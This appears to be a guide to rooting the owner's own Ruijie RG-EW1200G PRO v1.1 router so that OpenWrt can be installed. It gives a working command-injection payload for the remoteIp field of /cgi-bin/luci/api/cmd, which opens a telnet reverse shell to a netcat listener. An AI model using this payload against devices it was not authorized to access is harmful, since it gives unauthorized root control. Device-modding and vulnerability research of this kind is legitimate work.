Instructions to gain rootshell on Ruijie RG-EW1200G PRO v1.1 routers for openwrt installation

Source:  
https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37  
https://bbs.kanxue.com/thread-280448.htm

**Disclaimer: Proceeding with these instructions using the firmware provided may cause your Ruijie RG-EW1200G PRO v1.1 router to brick.
Please read through carefully and exercise extreme caution.
By using any of the resources and instructions provided, all risks and responsibilities will be solely on the user.
It is recommended to save and backup your existing configuration and working firmware before proceeding any further.**

Specific firmware version (EW_3.0(1)B11P219_EW1200GI_10182113) is required for a command injection vulnerability using http post on /cgi-bin/luci/api/cmd via the remoteIp field.
The working firmware for this is attached.
[RG-EW1200G PRO Wireless Routers EW_3.0(1)B11P219 firmware.zip](https://github.com/user-attachments/files/18793087/RG-EW1200G.PRO.Wireless.Routers.EW_3.0.1.B11P219.firmware.zip)

Step by step instructions:
1. Make sure the working firmware (EW_3.0(1)B11P219_EW1200GI_10182113) is installed on your Ruijie RG-EW1200G PRO v1.1 router before proceeding. Just login to the router's UI on a web browser and use the upgrade function.
2. Install Mozilla Firefox and HackBar extension https://addons.mozilla.org/en-US/firefox/addon/hackbar/
3. Download nc64.exe from https://github.com/int0x33/nc.exe/
4. Place nc64.exe at an easy to access drive or folder, for example drive D
5. Open windows powershell, navigate to drive D with command 'cd D:'  
   ![image](https://github.com/user-attachments/assets/3e6156c5-4661-4561-bb79-39dda7f195c9)
6. Start netcat lookup on port 666 with command '.\nc64.exe -lvvp 6666'
7. Go to your Ruijie RG-EW1200G PRO v1.1 router UI page by typing in the router IP on Mozilla Firefox
8. Login and open up the developer console (F12) and select the network tab  
   ![image](https://github.com/user-attachments/assets/5501998d-ffee-418f-a2a6-a0f40761c369)
9. Look for the auth code and copy the full URL with path /cgi-bin/luci/api/cmd as shown above
10. On the developer console top tab, select HackBar (might have to expand the tab to see HackBar)
11. Paste the URL copied in step 9 in the URL form, enable Use POST method and select application/json for post type  
    ![image](https://github.com/user-attachments/assets/68cc58f5-d32e-4de6-9d81-2c3470d276c0)
12. Enter the below code into the Body content and click EXECUTE
```
{
    "method": "devConfig.get",
    "params": {
        "module": "123",
        "remoteIp": "$(mkfifo /tmp/test;telnet <your windows machine ip> 6666 0</tmp/test|/bin/sh > /tmp/test)",
        "data": {
            "kkk": "abc"
        }
    }
}
```
13. If everything is executed correctly, the tab should load and send out the http post  
    ![image](https://github.com/user-attachments/assets/7b66c4c8-09a7-4fb9-8abf-d8af139035c1)
14. On the powershell window, there should be a response from the netcat lookup  
    ![image](https://github.com/user-attachments/assets/1c96ac98-a5be-4d12-a167-648be028b629)
15. Type 'pwd' then enter, followed by 'ls' to list the exposed folders and lastly 'id' to check for root access
16. If the rootshell process is done correctly, the response should be similar to the above image
